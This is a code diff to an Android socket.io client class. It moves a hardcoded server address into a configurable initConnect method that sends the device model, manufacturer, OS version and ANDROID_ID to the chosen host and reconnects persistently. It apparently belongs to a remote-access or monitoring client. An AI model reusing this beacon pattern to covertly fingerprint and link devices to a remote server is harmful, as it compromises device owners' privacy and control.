@@ -19,18 +19,6 @@ public class IOSocket {
 
 
     private IOSocket() {
-        try {
-
-            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
-            IO.Options opts = new IO.Options();
-            opts.reconnection = true;
-            opts.reconnectionDelay = 5000;
-            opts.reconnectionDelayMax = 999999999;
-
-            ioSocket = IO.socket("http://192.168.8.101:42474?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
-        } catch (URISyntaxException e) {
-            e.printStackTrace();
-        }
     }
 
 
@@ -40,6 +28,21 @@ public class IOSocket {
 
     public Socket getIoSocket() {
         return ioSocket;
+    }
+
+    public void initConnect(String host, String port) {
+        try {
+
+            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
+            IO.Options opts = new IO.Options();
+            opts.reconnection = true;
+            opts.reconnectionDelay = 5000;
+            opts.reconnectionDelayMax = 999999999;
+            String url = "http://" + host + ":" + port + "?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID;
+            ioSocket = IO.socket(url);
+        } catch (URISyntaxException e) {
+            e.printStackTrace();
+        }
     }
 
 
